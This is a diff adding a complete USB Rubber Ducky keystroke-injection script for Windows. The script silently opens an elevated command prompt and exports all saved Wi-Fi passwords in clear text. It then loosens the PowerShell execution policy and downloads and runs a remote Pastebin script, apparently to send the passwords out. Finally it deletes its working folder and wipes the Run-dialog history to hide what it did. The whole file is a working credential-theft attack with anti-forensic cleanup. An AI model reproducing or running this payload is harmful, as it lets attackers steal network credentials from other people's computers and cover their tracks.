@@ -1,0 +1,107 @@
+
+DELAY 1000
+
+GUI r
+
+DELAY 600
+
+STRING cmd 
+
+DELAY 800
+
+CTRL SHIFT 
+ENTER
+
+DELAY 1500
+
+ALT y 
+
+DELAY 1000
+
+STRING mode con:cols=18 lines=1
+
+ENTER
+
+DELAY 1000
+
+STRING color FE
+
+ENTER
+
+DELAY 400
+
+STRING cd C:\
+
+ENTER
+
+DELAY 600
+
+STRING md l 
+
+ENTER
+
+DELAY 500
+
+
+STRING cd l && netsh wlan export profile key=clear >nul
+
+ENTER
+
+DELAY 1000
+
+STRING powershell
+
+ENTER
+
+DELAY 800
+
+STRING set-executionpolicy unrestricted
+
+ENTER
+
+DELAY 800
+
+
+STRING IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/isrksvp0')
+
+ENTER
+
+DELAY 5000
+
+STRING cd ..
+
+ENTER 
+
+DELAY 1500
+
+STRING del "C:\l"
+
+ENTER
+
+DELAY 800
+
+STRING y
+
+ENTER
+
+DELAY 1500
+
+STRING rmdir "C:\l"
+
+ENTER
+
+DELAY 1000
+
+
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+
+ENTER
+
+DELAY 800
+
+STRING exit
+
+ENTER
+
+
+
